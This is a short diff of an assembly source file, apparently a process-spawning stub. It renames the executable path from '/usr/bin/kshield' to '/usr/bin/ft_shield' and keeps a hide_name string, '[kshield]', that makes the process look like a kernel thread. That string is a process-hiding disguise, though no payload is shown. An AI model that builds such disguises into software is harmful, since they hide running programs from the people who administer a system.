@@ -47,5 +47,5 @@ parent_process_thread:
 
 		jmp 0x000000
 
-cmd_path	db "/usr/bin/kshield", 0
+cmd_path	db "/usr/bin/ft_shield", 0
 hide_name	db "[kshield]", 0
